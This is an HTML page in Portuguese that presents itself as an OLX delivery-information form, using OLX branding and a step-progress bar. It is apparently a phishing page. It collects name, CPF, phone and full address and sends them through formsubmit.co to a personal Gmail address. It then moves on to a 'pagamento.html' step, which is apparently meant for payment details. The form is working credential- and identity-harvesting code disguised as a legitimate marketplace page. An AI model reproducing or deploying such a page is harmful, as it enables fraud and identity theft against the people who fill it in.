<!DOCTYPE html><html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>OLX - Entrega</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 400px;
      margin: 40px auto;
      background-color: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #f26a24;
    }
    label {
      display: block;
      margin: 10px 0 5px;
      color: #333;
    }
    input[type="text"],
    input[type="tel"],
    input[type="number"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      margin-top: 20px;
      background-color: #f26a24;
      color: white;
      border: none;
      width: 100%;
      padding: 12px;
      border-radius: 4px;
      font-size: 16px;
    }
    .barra {
      width: 100%;
      height: 6px;
      background: #ddd;
      margin-bottom: 20px;
      border-radius: 4px;
      overflow: hidden;
    }
    .progresso {
      height: 100%;
      width: 33%;
      background: #f26a24;
      animation: carregar 1s ease-in-out forwards;
    }
    @keyframes carregar {
      0% { width: 0%; }
      100% { width: 33%; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="barra"><div class="progresso"></div></div>
    <h2>Preencha seus dados de entrega</h2>
    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="hidden" name="formulario" value="Dados de Entrega OLX">
      <label>Nome completo</label>
      <input type="text" name="nome" required /><label>CPF</label>
  <input type="text" name="cpf" required />

  <label>Telefone</label>
  <input type="tel" name="telefone" required />

  <label>Endereço completo</label>
  <input type="text" name="endereco" placeholder="Rua, Número, Bairro" required />

  <label>Cidade</label>
  <input type="text" name="cidade" required />

  <label>Estado</label>
  <input type="text" name="estado" required />

  <label>CEP</label>
  <input type="text" name="cep" required />

  <button type="submit" formaction="pagamento.html">Próximo</button>
</form>

  </div>
</body>
</html>
